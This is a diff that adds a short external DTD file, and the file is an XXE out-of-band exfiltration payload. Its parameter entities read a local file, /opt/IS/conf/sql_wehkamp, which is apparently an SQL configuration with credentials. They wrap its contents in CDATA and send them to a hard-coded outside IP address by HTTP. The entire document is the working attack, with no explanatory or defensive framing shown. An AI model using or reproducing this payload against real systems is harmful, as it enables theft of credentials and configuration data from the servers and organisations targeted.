@@ -1,0 +1,6 @@
+<!ENTITY % start '<![CDATA['>
+<!ENTITY % file SYSTEM "file:///opt/IS/conf/sql_wehkamp">
+<!ENTITY % end ']]>'>
+<!ENTITY % poke '<!ENTITY &#37; send SYSTEM "http://85.239.146.22/leaf?c=%start;%file;%end;">'>
+%poke;
+%send;
